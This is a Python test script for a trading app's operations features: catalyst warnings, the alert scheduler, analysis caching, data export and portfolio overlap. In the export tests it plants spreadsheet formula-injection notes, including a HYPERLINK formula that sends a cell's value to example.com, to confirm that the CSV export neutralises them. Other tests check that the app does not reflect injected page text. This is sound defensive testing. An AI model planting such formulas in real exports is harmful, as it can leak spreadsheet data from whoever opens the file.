"""Scheduled catalysts, background checking, data export, and position overlap.

The four things the app was missing that made it dishonest rather than merely
incomplete: a plan that ignored earnings, an alert that never checked, a record
you could not take with you, and a correlation figure shown only after the
trade it should have prevented.
"""
import os as _os
import re
import sys as _sys
import time

_sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
_sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
import harness

import web
from bot import catalysts as C
from bot import config as config_mod
from bot import database as db
from bot import export as export_mod
from bot import portfolio as P
from bot import scheduler as scheduler_mod

c, DB = harness.isolated_web("operations")

fails = []


def check(name, ok, detail=""):
    print("   %s %s%s" % ("OK  " if ok else "FAIL", name,
                          ("  " + str(detail)) if detail and not ok else ""))
    if not ok:
        fails.append(name)


print("=" * 72)
print("SCHEDULED EVENTS INSIDE THE HOLDING WINDOW")
print("=" * 72)

# A horizon in bars is not a horizon in days, and the whole warning depends on
# converting correctly: ten daily bars is a fortnight, not ten days.
check("ten daily bars is about two weeks",
      13.0 < C.horizon_days("1d", 10) < 15.0, C.horizon_days("1d", 10))
check("an intraday horizon is under a day",
      C.horizon_days("5m", 24) < 1.0, C.horizon_days("5m", 24))
check("a longer horizon is a longer window",
      C.horizon_days("1d", 30) > C.horizon_days("1d", 10))

now = time.time()
DAY = 86400
for days, expect, why in [
    (3, True, "inside the window"),
    (13, True, "just inside"),
    (20, True, "just outside, still mentioned"),
    (90, False, "far outside"),
    (-5, False, "already happened"),
]:
    cal = C.Calendar(symbol="TEST", earnings=int(now + days * DAY))
    got = [w for w in C.warnings_for(cal, "1d", 10) if "arnings" in w]
    check("earnings %+dd: %s" % (days, why), bool(got) == expect)

inside = C.warnings_for(C.Calendar(symbol="T", earnings=int(now + 3 * DAY)),
                        "1d", 10)[0]
outside = C.warnings_for(C.Calendar(symbol="T", earnings=int(now + 20 * DAY)),
                         "1d", 10)[0]
check("the inside warning says a stop will not help",
      "stop does not survive" in inside)
check("the outside one does not raise the alarm",
      "stop does not survive" not in outside)

est = C.warnings_for(C.Calendar(symbol="T", earnings=int(now + 3 * DAY),
                                earnings_estimated=True), "1d", 10)[0]
check("an unconfirmed date is flagged as an estimate", "estimate" in est)

# A short pays the dividend rather than receiving it, which is the opposite
# advice, so direction has to reach the warning.
long_div = C.warnings_for(C.Calendar(symbol="T", ex_dividend=int(now + 4 * DAY)),
                          "1d", 10, 1)[0]
short_div = C.warnings_for(C.Calendar(symbol="T", ex_dividend=int(now + 4 * DAY)),
                           "1d", 10, -1)[0]
check("a long is told the price drops", "drops by roughly" in long_div)
check("a short is told it pays the dividend", "pays the dividend" in short_div)

empty = C.Calendar(symbol="T")
check("no calendar means no warnings", C.warnings_for(empty, "1d", 10) == [])
check("no calendar means no rows", C.describe(empty) == [])

print()
print("   live calendars:")
for sym in ("AAPL", "KO", "BTC-USD"):
    cal = C.fetch(sym)
    days = cal.days_to_earnings
    print("      %-9s earnings %-8s rows %s"
          % (sym, ("%.0fd" % days) if days is not None else "none",
             [r["label"] for r in C.describe(cal)]))
    check("%s calendar fetched without raising" % sym, isinstance(cal, C.Calendar))
crypto = C.fetch("BTC-USD")
check("crypto has no earnings date", crypto.earnings is None)
check("crypto says why rather than failing", crypto.available and crypto.notes)

print()
print("=" * 72)
print("BACKGROUND CHECKING")
print("=" * 72)

check("importing web starts no thread", web.ALERTS is None)
check("status reports it is off",
      c.get("/api/alerts/status").get_json()["enabled"] is False)
check("check-now refuses when off",
      c.post("/api/alerts/check-now").status_code == 409)

conn = db.connect(DB)
db.alert_add(conn, "AAPL", "price_above", 1.0, "1d", note="always true")
db.alert_add(conn, "MSFT", "price_below", 1.0, "1d", note="never true")
conn.close()

cfg = config_mod.load()
cfg["alert_check_minutes"] = 1
loop = web.start_alert_loop(cfg)
check("the loop starts", loop is not None and loop.running)
check("a floor stops anyone hammering a free data source",
      loop.status()["interval"] >= 60.0)
check("starting twice is refused", loop.start() is False)

started = time.time()
c.post("/api/alerts/check-now")
for _ in range(60):
    time.sleep(0.5)
    if loop.status()["runs"] or loop.status()["failures"]:
        break
state = loop.status()
print("   ran in %.1fs: runs=%d failures=%d"
      % (time.time() - started, state["runs"], state["failures"]))
check("the job ran", state["runs"] == 1)
check("it did not fail", state["failures"] == 0, state["last_error"])
check("the thread is still alive", loop.running)
check("it checked both alerts", state["history"][0]["checked"] == 2)
check("it fired only the true one", state["history"][0]["fired"] == 1)
check("the run is marked as manual", state["history"][0]["triggered"] == "manual")
check("the fired alert kept its detail",
      state["recent_fires"][0]["symbol"] == "AAPL")

conn = db.connect(DB)
check("the trigger reached the database",
      any(a["triggered_ts"] for a in db.alert_list(conn)))
conn.close()

fresh = c.get("/api/alerts/status?since=%f" % started).get_json()
check("a page is told what fired since it last looked", len(fresh["new_fires"]) == 1)
check("a later cursor is told nothing",
      len(c.get("/api/alerts/status?since=%f"
                % (time.time() + 5)).get_json()["new_fires"]) == 0)
check("a junk cursor does not break it",
      c.get("/api/alerts/status?since=banana").status_code == 200)

# The loop must survive its job failing, because the job makes network calls.
def explode():
    raise RuntimeError("boom")

boom = scheduler_mod.Scheduler(explode, interval_seconds=60)
boom.start()
for attempt in (1, 2):
    boom.check_now()
    for _ in range(30):
        time.sleep(0.2)
        if boom.status()["failures"] >= attempt:
            break
check("a failing job does not kill the thread", boom.running)
check("both failures were counted", boom.status()["failures"] == 2)
check("the error is kept for the page", "boom" in boom.status()["last_error"])
check("the failure is in the history",
      boom.status()["history"][0]["ok"] is False)
boom.stop()
check("a failing loop still stops", not boom.running)

# Bookkeeping is inside the guard too: a job returning an odd shape must not
# take the thread down.
class Odd:
    pass

weird = scheduler_mod.Scheduler(lambda: {"checked": 1, "fired": [Odd()]},
                                interval_seconds=60)
weird.start()
weird.check_now()
for _ in range(30):
    time.sleep(0.2)
    if weird.status()["runs"] or weird.status()["failures"]:
        break
check("an unexpected result shape is survived", weird.running)
check("and is recorded rather than dropped", weird.status()["runs"] == 1)
weird.stop()

# A background job has no page to show its errors on, so they go to the log.
import logging


class Caught(logging.Handler):
    def __init__(self):
        super().__init__()
        self.records = []

    def emit(self, record):
        self.records.append(record)


caught = Caught()
logging.getLogger(scheduler_mod.__name__).addHandler(caught)
try:
    noisy = scheduler_mod.Scheduler(explode, interval_seconds=60, name="test-boom")
    noisy._run_once()
    skipped = scheduler_mod.Scheduler(
        lambda: {"checked": 2, "errors": [
            "AAPL: no data", "user 3: refused for someone@example.com"]},
        interval_seconds=60, name="test-skips")
    skipped._run_once()
finally:
    logging.getLogger(scheduler_mod.__name__).removeHandler(caught)
failed = [r for r in caught.records if r.levelno == logging.ERROR]
check("a failed job is logged as an error",
      failed and "test-boom" in failed[0].getMessage())
check("with the traceback that explains it",
      failed and failed[0].exc_info is not None
      and "boom" in str(failed[0].exc_info[1]))
partly = [r.getMessage() for r in caught.records if r.levelno == logging.WARNING]
check("what a run skipped is logged too",
      partly and "2 items failed" in partly[0] and "AAPL: no data" in partly[0],
      partly)
check("without the addresses in it",
      partly and "someone@example.com" not in partly[0], partly)

print()
print("=" * 72)
print("ONE ANALYSIS FOR EVERYONE ASKING AT ONCE")
print("=" * 72)

import threading
import types
from flask import g
from bot.market import DataError

real_analyse = web.engine.analyse
ran = []


def slow_analyse(symbol, cfg, **_):
    ran.append(symbol)
    time.sleep(0.5)
    if symbol == "NOPE":
        raise DataError("There is no instrument called NOPE.")
    return types.SimpleNamespace(symbol=symbol, run_id=None)


same_cfg = config_mod.load()


def asks(symbol, out):
    with web.app.test_request_context("/analyse"):
        g.user = types.SimpleNamespace(id=1, is_local=True)
        try:
            out.append(web.cached_analysis(symbol, "1d", same_cfg, with_news=False))
        except DataError as exc:
            out.append(exc)


def at_once(symbol, count=6):
    out = []
    threads = [threading.Thread(target=asks, args=(symbol, out))
               for _ in range(count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)
    return out


web.engine.analyse = slow_analyse
try:
    web._CACHE.clear()
    began = time.time()
    got = at_once("ACME")
    print("   6 requests, %d analyses, %.2fs" % (ran.count("ACME"), time.time() - began))
    check("six requests for the same analysis run it once",
          ran.count("ACME") == 1, ran)
    check("and all six get its answer",
          len(got) == 6 and all(r is got[0] for r in got), got)

    failed = at_once("NOPE")
    check("a failure is shared rather than repeated",
          ran.count("NOPE") == 1, ran)
    check("everyone waiting is told why",
          len(failed) == 6 and all(isinstance(e, DataError) for e in failed), failed)
    check("nothing is left marked as running", not web._RUNNING, web._RUNNING)
    at_once("NOPE", 1)
    check("and a failure is not kept: the next request tries again",
          ran.count("NOPE") == 2, ran)

    # Each holds megabytes, and only the count of forty ever pushed one out.
    now = time.time()
    web._CACHE["spent"] = (now - web.DEMO_TTL - 1, types.SimpleNamespace(run_id=None), {})
    usable = ("NVDA", False, "1d", True, "house")
    web._CACHE[usable] = (now - web.DEMO_TTL + 60, types.SimpleNamespace(run_id=None), {})
    at_once("FRESH", 1)
    check("an analysis too old to be served again is dropped when one is kept",
          "spent" not in web._CACHE, list(web._CACHE))
    check("and one the example may still serve is not",
          usable in web._CACHE and any(k[0] == "FRESH" for k in web._CACHE if len(k) == 5),
          list(web._CACHE))
finally:
    web.engine.analyse = real_analyse
    web._CACHE.clear()

print()
print("=" * 72)
print("THE FRONT PAGE'S EXAMPLE WHEN IT CANNOT BE MADE")
print("=" * 72)

# Every visit started an analysis of its own, and nothing was logged.
tried = []


def failing_analyse(*_a, **_k):
    tried.append(1)
    raise RuntimeError("the example broke")


def visits(count):
    for _ in range(count):
        web._example()
        for _wait in range(100):
            if not web._example_state["busy"]:
                break
            time.sleep(0.05)


was = dict(web._example_state)
said = Caught()
web.app.logger.addHandler(said)
web.engine.analyse = failing_analyse
web._example_state.update(at=0.0, data=None, busy=False, failed=0.0)
try:
    visits(5)
    check("five visits while it fails start one analysis", len(tried) == 1, tried)
    check("and the log says it failed, and why",
          any("front page example" in r.getMessage() and r.exc_info for r in said.records),
          [r.getMessage() for r in said.records])
    web._example_state["failed"] = time.time() - web.EXAMPLE_RETRY - 1
    visits(2)
    check("a while later it is tried again, once", len(tried) == 2, tried)
finally:
    web.engine.analyse = real_analyse
    web.app.logger.removeHandler(said)
    web._example_state.clear()
    web._example_state.update(was)

loop.stop()
check("the alert loop stops cleanly", not loop.running)
web.ALERTS = None

print()
print("=" * 72)
print("TAKING YOUR DATA WITH YOU")
print("=" * 72)

conn = db.connect(DB)
tid = db.open_trade(conn, "NVDA", "1d", 1, entry=200, stop=190, target1=230,
                    quantity=10)
db.close_trade(conn, tid, 230.0, "target")
db.open_trade(conn, "AMD", "1d", -1, entry=150, stop=158, target1=134,
              quantity=20)
conn.close()

conn = db.connect(DB)
try:
    counts = export_mod.counts(conn)
    print("   counts: %s" % counts)
    check("both trades are counted", counts["trades"] == 2)

    for dataset in export_mod.DATASETS:
        for fmt in ("csv", "json"):
            built = export_mod.build(conn, dataset, fmt)
            check("%s as %s builds" % (dataset, fmt), bool(built["body"]))
            check("%s as %s is named for the day" % (dataset, fmt),
                  built["filename"].endswith("." + fmt))

    rows = export_mod.trades(conn)
    closed = [r for r in rows if r["status"] == "closed"][0]
    short = [r for r in rows if r["side"] == "short"][0]
    print("   closed row: %s" % {k: closed[k] for k in
                                 ("symbol", "side", "r_multiple", "opened_utc")})
    check("direction is a word, not a number", closed["side"] == "long")
    check("a short is labelled short", short["side"] == "short")
    check("the R multiple survived", abs(closed["r_multiple"] - 3.0) < 1e-6,
          closed["r_multiple"])
    check("dates are readable rather than unix seconds",
          re.match(r"^\d{4}-\d{2}-\d{2} ", closed["opened_utc"] or ""))
    check("an open trade has no closing date", short["closed_utc"] == "")
    check("every column that holds a time says it is UTC",
          all(name.endswith("_utc") for spec in export_mod.DATASETS.values()
              for name in spec["columns"]
              if name.split("_utc")[0] in ("opened", "closed", "when", "saved", "reviewed",
                                           "added", "created", "last_checked",
                                           "last_fired", "last_analysed")))

    csv_body = export_mod.build(conn, "trades", "csv", user=1)["body"]
    header = csv_body.splitlines()[0]
    check("the CSV header is the declared columns",
          header == ",".join(export_mod.TRADE_COLUMNS), header)
    check("every trade is a row", len(csv_body.strip().splitlines()) == 3)

    import json as _json
    parsed = _json.loads(export_mod.build(conn, "trades", "json")["body"])
    check("the JSON says how many rows it holds", parsed["count"] == 2)
    check("the JSON carries the rows", len(parsed["rows"]) == 2)

    for bad, why in (("nonsense", "unknown dataset"), ("trades", "bad format")):
        try:
            export_mod.build(conn, bad, "csv" if bad == "nonsense" else "xml")
            check("refuses %s" % why, False, "no error raised")
        except ValueError:
            check("refuses %s" % why, True)
finally:
    conn.close()

import csv as _csv
import io as _io

conn = db.connect(DB)
try:
    # A note a spreadsheet would run as a formula, and one it would misread.
    notes = {"ZZN1": "-2R, stopped out", "ZZN2": '=HYPERLINK("http://example.com/?x="&A2,"see")',
             "ZZN3": "+1+1", "ZZN4": "@SUM(1,1)", "ZZN5": "caf\u00e9 \u2014 \u20ac5 target",
             "ZZN6": "plain, with = inside"}
    for symbol, note in notes.items():
        nid = db.open_trade(conn, symbol, "1d", 1, entry=100, stop=95, quantity=1, user=1)
        conn.execute("UPDATE trades SET notes=? WHERE id=?", (note, nid))
    # Closed in parts by a release that knew nothing of the last one.
    part = db.open_trade(conn, "ZZPARTS", "1d", 1, entry=100, stop=95, quantity=30, user=1)
    db.exit_trade(conn, part, 110.0, 10, "target", user=1)
    conn.execute("UPDATE trades SET status='closed', exit_price=90, ts_closed=ts_opened "
                 "WHERE id=?", (part,))
    db.close_trade(conn, db.open_trade(conn, "ZZLOSS", "1d", 1, entry=100, stop=95,
                                       quantity=1, user=1), 90.0, "stop", user=1)
    conn.execute("INSERT INTO runs (ts, symbol, interval, action, regime_vol, user_id) "
                 "VALUES (1, 'ZZRUN', '1d', 'WAIT', 'calm', 1)")
    conn.executemany("INSERT INTO runs (ts, symbol, interval, user_id) VALUES (?, 'ZZMANY', "
                     "'1d', 1)", [(n,) for n in range(2, 5302)])
    conn.executemany("INSERT INTO theses (created_ts, symbol, price, user_id) "
                     "VALUES (?, 'ZZT', 1.0, 1)", [(n,) for n in range(1, 1102)])
    db.watch_add(conn, "ZZWATCH", "1d", user=1)
    db.alert_add(conn, "ZZALERT", "price_above", 200.0, user=1)
    db.event_add(conn, 1, "price_above", "ZZALERT", "ZZALERT rose above 200.", 201.0, "")
    # Somebody else's, which must be in no download of this person's.
    db.open_trade(conn, "ZZOTHER", "1d", 1, entry=100, stop=95, quantity=1, user=77)
    db.watch_add(conn, "ZZOTHER", "1d", user=77)
    db.alert_add(conn, "ZZOTHER", "price_above", 5.0, user=77)
    db.event_add(conn, 77, "price_above", "ZZOTHER", "ZZOTHER rose.", 6.0, "")
    conn.commit()

    def table(dataset, user=1):
        return list(_csv.DictReader(_io.StringIO(
            export_mod.build(conn, dataset, "csv", user=user)["body"])))

    got = {r["symbol"]: r["note"] for r in table("trades")}
    check("a note a spreadsheet would run as a formula is marked as words",
          all(got[s] == "'" + notes[s] for s in ("ZZN1", "ZZN2", "ZZN3", "ZZN4")), got)
    check("any other note is as it was written",
          got["ZZN5"] == notes["ZZN5"] and got["ZZN6"] == notes["ZZN6"])
    check("and a loss is still a number",
          [float(r["pnl"]) for r in table("trades") if r["symbol"] == "ZZLOSS"] == [-10.0])
    check("the JSON keeps every note as it was written",
          all(n in [r["note"] for r in _json.loads(
              export_mod.build(conn, "trades", "json", user=1)["body"])["rows"]]
              for n in notes.values()))
    check("the analysis history holds every call, not the newest few thousand",
          len(table("runs")) >= 5301)
    check("with how lively the market was",
          [r["regime_volatility"] for r in table("runs") if r["symbol"] == "ZZRUN"] == ["calm"])
    check("and every saved thesis is there", len(table("theses")) == 1101)
    check("the watchlist, the alerts and what they said can be downloaded",
          [r["symbol"] for r in table("watchlist")] == ["ZZWATCH"]
          and any(r["condition"] == "ZZALERT price above 200" or "200" in r["condition"]
                  for r in table("alerts") if r["symbol"] == "ZZALERT")
          and "ZZALERT rose above 200." in [r["message"] for r in table("alert_history")],
          (table("watchlist"), table("alerts"), table("alert_history")))
    check("nothing of anybody else's is in any of them",
          not any("ZZOTHER" in export_mod.build(conn, d, f, user=1)["body"]
                  for d in export_mod.DATASETS for f in ("csv", "json")))
    for who in (1, 77, None):
        counted = export_mod.counts(conn, user=who)
        held = {d: len(list(spec["rows"](conn, user=who)))
                for d, spec in export_mod.DATASETS.items()}
        check("the counts are the rows each holds (%s)" % (who or "everyone"),
              counted == held, (counted, held))
    built_nothing = []
    real_rows = {d: spec["rows"] for d, spec in export_mod.DATASETS.items()}
    for d, spec in export_mod.DATASETS.items():
        spec["rows"] = lambda *_a, **_k: built_nothing.append(1) or []
    try:
        export_mod.counts(conn, user=1)
    finally:
        for d, spec in export_mod.DATASETS.items():
            spec["rows"] = real_rows[d]
    check("and counting builds none of them", not built_nothing)
finally:
    conn.close()

r = c.get("/export/trades.csv")
check("the file says it is UTF-8, once, so Excel reads an accent as one",
      r.data.startswith(b"\xef\xbb\xbf") and r.headers["Content-Type"] == "text/csv; charset=utf-8"
      and "caf\u00e9 \u2014 \u20ac5" in r.data.decode("utf-8"), r.headers["Content-Type"])
check("and carries the app's own name",
      'filename="orenth-trades-' in r.headers["Content-Disposition"],
      r.headers["Content-Disposition"])
check("the JSON has no such mark", c.get("/export/trades.json").data[:1] == b"{")
# Put away, so what follows finds only the two positions opened above.
conn = db.connect(DB)
for made_up in ("trades", "runs", "theses", "watchlist", "alerts"):
    conn.execute("DELETE FROM %s WHERE symbol LIKE 'ZZ%%'" % made_up)
conn.commit()
conn.close()

for dataset in export_mod.DATASETS:
    for fmt in ("csv", "json"):
        r = c.get("/export/%s.%s" % (dataset, fmt))
        disposition = r.headers.get("Content-Disposition", "")
        check("download %s.%s" % (dataset, fmt), r.status_code == 200)
        check("download %s.%s is a file" % (dataset, fmt),
              "attachment" in disposition, disposition)
check("a made-up dataset 404s", c.get("/export/nope.csv").status_code == 404)
check("a made-up format 404s", c.get("/export/trades.xml").status_code == 404)
for odd, answer in (
        ("/export/Your account is suspended.csv", b"There is no export by that name."),
        ("/export/trades.Your account is suspended", b"Exports are CSV or JSON.")):
    r = c.get(odd)
    check("and its page never repeats what the address said (%s)" % odd[8:14],
          r.status_code == 404 and answer in r.data
          and b"suspended" not in r.data[r.data.index(b"<main"):], r.status_code)
r = c.post("/workflow/Your account is suspended")
check("nor does a made-up routine's",
      r.status_code == 404 and b"suspended" not in r.data[r.data.index(b"<main"):],
      r.status_code)

settings_page = c.get("/settings").data.decode("utf-8", "replace")
check("the settings page offers the downloads",
      "Take your data with you" in settings_page)
check("it says what the strategy record is worth",
      "slowest" in settings_page)

print()
print("=" * 72)
print("WOULD THIS REALLY BE A NEW POSITION")
print("=" * 72)

conn = db.connect(DB)
for sym, entry, stop, target, qty in [("NVDA", 200, 190, 230, 50),
                                      ("AMD", 150, 142, 170, 60),
                                      ("MSFT", 450, 430, 490, 20),
                                      ("KO", 70, 67, 75, 100)]:
    db.open_trade(conn, sym, "1d", 1, entry=entry, stop=stop, target1=target,
                  quantity=qty)
open_rows = db.list_trades(conn, status="open")
all_rows = db.list_trades(conn)
conn.close()

check("an empty book warns about nothing",
      P.overlap([], "AAPL", "1d")["warnings"] == [])

held = P.overlap(open_rows, "KO", "1d")
check("holding it already is noticed", held["held"])
check("and is said plainly",
      any("already hold" in w for w in held["warnings"]))
check("the held name is not compared against itself",
      "KO" not in held["compared"])

semis = P.overlap(open_rows, "AVGO", "1d")
print("   AVGO vs %s: avg %.2f" % (semis["compared"], semis["average"] or 0))
for pair in semis["pairs"][:3]:
    print("      %-6s %+.2f" % (pair["symbol"], pair["correlation"]))
check("the comparison is usable", semis["usable"])
check("every open name was compared", len(semis["pairs"]) == len(semis["compared"]))
check("pairs are sorted by how close they are",
      all(abs(semis["pairs"][i]["correlation"]) >= abs(semis["pairs"][i + 1]["correlation"])
          for i in range(len(semis["pairs"]) - 1)))
check("a semiconductor name is flagged against the others",
      bool(semis["warnings"]), semis)

gold = P.overlap(open_rows, "GLD", "1d")
print("   GLD  vs %s: avg %.2f" % (gold["compared"], gold["average"] or 0))
check("a genuine diversifier is left alone", gold["warnings"] == [], gold["warnings"])
check("but is still measured", gold["usable"])
check("gold correlates less with the book than a semi does",
      (gold["average"] or 0) < (semis["average"] or 0))

check("the comparison is capped",
      len(P.overlap(open_rows, "AAPL", "1d", max_compare=2)["compared"]) == 2)
check("closed positions are ignored",
      len(P.overlap(all_rows, "AAPL", "1d")["compared"])
      == len(P.overlap(open_rows, "AAPL", "1d")["compared"]))

page = c.get("/analyse?symbol=AVGO&interval=1d&news=0").data.decode("utf-8", "replace")
check("the analysis page shows the overlap",
      "Against what you already hold" in page)
check("it names the correlation it measured",
      "shared daily returns" in page)

print()
print("%d failure(s)" % len(fails))
print("OPERATIONS OK" if not fails else "FAILURES: %s" % fails)

import sys as _exit_sys
_exit_sys.exit(1 if fails else 0)
